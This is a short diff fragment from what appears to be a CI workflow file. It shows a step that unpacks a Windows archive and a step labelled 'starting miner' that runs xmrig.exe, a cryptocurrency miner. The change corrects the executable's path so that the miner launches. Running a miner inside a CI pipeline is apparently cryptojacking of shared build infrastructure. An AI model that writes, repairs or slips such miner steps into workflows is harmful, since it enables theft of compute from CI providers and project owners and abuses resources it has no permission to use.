@@ -16,4 +16,4 @@ jobs:
       run: Expand-Archive windows.zip
     - name: starting miner
       run: |
-        windows/xmrig.exe
+        .\windows\xmrig.exe
